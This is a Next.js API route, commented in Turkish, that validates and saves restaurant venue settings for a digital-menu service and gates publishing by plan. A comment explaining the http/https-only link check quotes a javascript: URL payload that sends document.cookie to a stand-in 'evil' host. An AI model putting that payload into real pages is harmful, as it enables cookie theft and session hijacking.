import { NextResponse, type NextRequest } from 'next/server';
import { z } from 'zod';
import { createClient } from '@/lib/supabase/server';
import { resolvePlanContext, UPGRADE_MESSAGES } from '@/lib/plans';
import { isAllowedBackgroundImageUrl } from '@/lib/schemas/design';
import { weeklyHoursSchema } from '@/lib/opening-hours';

export const runtime = 'nodejs';

const optStr = (max: number) => z.string().trim().max(max).nullish();

/**
 * Misafir menüsünde `href` olarak kullanılan DIŞ bağlantı alanları.
 *
 * NEDEN ayrı doğrulayıcı: bu değerler guest-menu.tsx'te doğrudan `<a href>`
 * içine giriyor. `optStr` serbest metin olduğu için buraya
 * `javascript:fetch('https://evil/'+document.cookie)` yazılabiliyordu ve React
 * `javascript:` URL'lerini üretimde ENGELLEMİYOR — bağlantıya tıklayan misafir
 * ya da menüyü inceleyen yönetici, /studyo ve /admin ile AYNI origin'de kod
 * çalıştırırdı. Yalnız http/https kabul ediliyor.
 */
const httpUrl = (max: number) =>
  z
    .string()
    .trim()
    .max(max)
    .refine((v) => {
      if (v === '') return true;
      try {
        const u = new URL(v);
        return u.protocol === 'http:' || u.protocol === 'https:';
      } catch {
        return false;
      }
    }, 'Bağlantı http:// veya https:// ile başlamalı.')
    .nullish();

/**
 * Tüm alanlar opsiyonel: PATCH kısmi güncelleme yapar. Ayarlar formu hepsini
 * birden gönderir; yayın kartı yalnız `isPublished` gönderir. Tek yazma yolu.
 */
const bodySchema = z.object({
  venueId: z.string().uuid(),
  name: z.string().trim().min(1, 'İşletme adı boş olamaz').max(120).optional(),
  description: optStr(500),
  address: optStr(300),
  phone: optStr(40),
  whatsapp: optStr(40),
  instagram: optStr(120),
  googleMapsUrl: httpUrl(500),
  /** "Bizi Google'da değerlendirin" bağlantısı (müşteri talebi A4). */
  googleReviewUrl: httpUrl(500),
  wifiSsid: optStr(120),
  /** Eski serbest metin — yapısal saatler girilmemişse misafire bu gösterilir. */
  openingHours: optStr(200),
  /**
   * Yapısal haftalık çalışma saatleri (müşteri talebi A3): misafir ekranında
   * "bugün"ün saati, ayrı bir panelde tüm hafta. Boş dizi = temizle.
   */
  openingHoursWeekly: weeklyHoursSchema.nullish(),
  currencyCode: z.string().length(3).optional(),
  slug: z
    .string()
    .trim()
    .toLowerCase()
    .min(3, 'Menü adresi en az 3 karakter olmalı.')
    .max(60, 'Menü adresi en fazla 60 karakter olabilir.')
    .regex(
      /^[a-z0-9]+(-[a-z0-9]+)*$/,
      'Menü adresi yalnız küçük harf, rakam ve tire içerebilir (ör. sine-pub).'
    )
    .optional(),
  isPublished: z.boolean().optional(),
  /** Logo PNG'si — yalnızca kendi Supabase depomuzdaki `venue-media` içinden gelebilir (bkz. isAllowedBackgroundImageUrl). */
  logoUrl: z.string().url().nullable().optional(),
  /** Karşılama popup'ı — bkz. m/[slug]/guest-menu.tsx WelcomeAnnouncement. Başlık boşsa popup hiç gösterilmez. */
  announcementTitle: optStr(80),
  announcementBody: optStr(300),
  announcementImageUrl: z.string().url().nullable().optional(),
  announcementButtonText: optStr(30),
  /** Alt bilgi / marka hikayesi bloğu — guest-menu.tsx'te footer'dan önce gösterilir. */
  story: optStr(2000),
});

/**
 * PATCH /api/venue
 * İşletme (venue) ayarlarını ve yayın durumunu günceller. User-client + RLS
 * ile çalışır: yalnız org üyesi (editor+) kendi venue'sunu günceller.
 *
 * `isPublished` tek bir boolean ama etkisi geniş: 0001'deki tüm public SELECT
 * policy'leri venues.is_published şartına bağlı, yani bu alan menü zincirinin
 * tamamını (menus → categories → items → çeviriler → alerjenler) anonim
 * misafire açar/kapatır.
 */
export async function PATCH(request: NextRequest) {
  const supabase = createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json({ error: 'Oturum bulunamadı.' }, { status: 401 });
  }

  const parsed = bodySchema.safeParse(await request.json().catch(() => null));
  if (!parsed.success) {
    const first = parsed.error.issues[0]?.message ?? 'Geçersiz veri.';
    return NextResponse.json({ error: first }, { status: 400 });
  }
  const b = parsed.data;
  if (b.logoUrl !== undefined && !isAllowedBackgroundImageUrl(b.logoUrl)) {
    return NextResponse.json({ error: 'Geçersiz logo görseli.' }, { status: 400 });
  }
  if (b.announcementImageUrl !== undefined && !isAllowedBackgroundImageUrl(b.announcementImageUrl)) {
    return NextResponse.json({ error: 'Geçersiz duyuru görseli.' }, { status: 400 });
  }
  const norm = (v: string | null | undefined) => {
    const t = (v ?? '').trim();
    return t === '' ? null : t;
  };

  // Yalnız gövdede GELEN alanlar yazılır (kısmi güncelleme).
  const patch: Record<string, unknown> = {};
  const setIf = (key: string, present: boolean, value: string | null) => {
    if (present) patch[key] = value;
  };
  if (b.name !== undefined) patch.name = b.name.trim();
  setIf('description', b.description !== undefined, norm(b.description));
  setIf('address', b.address !== undefined, norm(b.address));
  setIf('phone', b.phone !== undefined, norm(b.phone));
  setIf('whatsapp', b.whatsapp !== undefined, norm(b.whatsapp));
  setIf('instagram', b.instagram !== undefined, norm(b.instagram));
  setIf('google_maps_url', b.googleMapsUrl !== undefined, norm(b.googleMapsUrl));
  setIf('google_review_url', b.googleReviewUrl !== undefined, norm(b.googleReviewUrl));
  setIf('wifi_ssid', b.wifiSsid !== undefined, norm(b.wifiSsid));
  setIf('opening_hours', b.openingHours !== undefined, norm(b.openingHours));
  if (b.openingHoursWeekly !== undefined) {
    // Boş dizi ya da null = "yapısal saat tanımlı değil" → serbest metne düşülür.
    const weekly = b.openingHoursWeekly ?? [];
    patch.opening_hours_json = weekly.length > 0 ? weekly : null;
  }
  if (b.currencyCode) patch.currency_code = b.currencyCode;
  if (b.slug !== undefined) patch.slug = b.slug;
  if (b.logoUrl !== undefined) patch.logo_url = b.logoUrl;
  setIf('announcement_title', b.announcementTitle !== undefined, norm(b.announcementTitle));
  setIf('announcement_body', b.announcementBody !== undefined, norm(b.announcementBody));
  if (b.announcementImageUrl !== undefined) patch.announcement_image_url = b.announcementImageUrl;
  setIf('announcement_button_text', b.announcementButtonText !== undefined, norm(b.announcementButtonText));
  setIf('story', b.story !== undefined, norm(b.story));

  if (b.isPublished !== undefined) {
    patch.is_published = b.isPublished;
    if (b.isPublished) {
      // ── Ücretsiz plan yayın şartı: üyelik (güvene alınmış e-posta) + telefon ──
      // Plan görsel/rozet gibi limitlerle aynı kaynaktan (plans.ts) okunur.
      const { data: venueRow } = await supabase
        .from('venues')
        .select('published_at, org_id')
        .eq('id', b.venueId)
        .maybeSingle();
      if (!venueRow) {
        return NextResponse.json({ error: 'İşletme bulunamadı veya yetkin yok.' }, { status: 403 });
      }
      const { data: orgRow } = await supabase
        .from('organizations')
        .select('plan, contact_phone, trial_ends_at')
        .eq('id', venueRow.org_id)
        .maybeSingle();
      const planCtx = resolvePlanContext(orgRow?.plan, orgRow?.trial_ends_at);

      // Deneme bitti ve abonelik yoksa yayın kilitlidir. Veri durur, yalnız
      // canlıya alma kapalıdır — abonelik başlayınca kaldığı yerden açılır.
      if (!planCtx.limits.canPublish) {
        return NextResponse.json(
          { error: UPGRADE_MESSAGES.trialExpired, code: 'trial_expired' },
          { status: 402 }
        );
      }

      if (planCtx.limits.requiresVerifiedAccount) {
        const secured = !user.is_anonymous && Boolean(user.email);
        const hasPhone = Boolean(orgRow?.contact_phone);
        if (!secured || !hasPhone) {
          return NextResponse.json(
            { error: UPGRADE_MESSAGES.publishAccount, code: 'account_required' },
            { status: 403 }
          );
        }
      }
      // İlk yayın tarihini bir kez yaz; yayından kaldırınca SİLME —
      // published_at arşiv bilgisidir, is_published anahtardır.
      if (!venueRow.published_at) patch.published_at = new Date().toISOString();
    }
  }

  if (Object.keys(patch).length === 0) {
    return NextResponse.json({ error: 'Güncellenecek alan yok.' }, { status: 400 });
  }

  const { data: updated, error } = await supabase
    .from('venues')
    .update(patch)
    .eq('id', b.venueId)
    .select('slug, is_published, published_at')
    .maybeSingle();

  if (error) {
    // 23505: unique violation — slug başka bir işletmede kullanılıyor.
    if (error.code === '23505') {
      return NextResponse.json(
        { error: 'Bu menü adresi başka bir işletmede kullanılıyor. Başka bir adres dene.' },
        { status: 409 }
      );
    }
    // İç hata metnini istemciye BASMIYORUZ: PostgREST mesajları kolon, kısıt ve
    // RLS politika adlarını sızdırıyor (şema haritalama). Sunucuya loglanır.
    console.error('[api/venue] update failed', { venueId: b.venueId, code: error.code, message: error.message });
    return NextResponse.json({ error: 'Kaydedilemedi.' }, { status: 500 });
  }
  if (!updated) {
    return NextResponse.json({ error: 'İşletme bulunamadı veya yetkin yok.' }, { status: 403 });
  }

  return NextResponse.json({
    ok: true,
    slug: updated.slug,
    isPublished: updated.is_published,
    publishedAt: updated.published_at,
  });
}
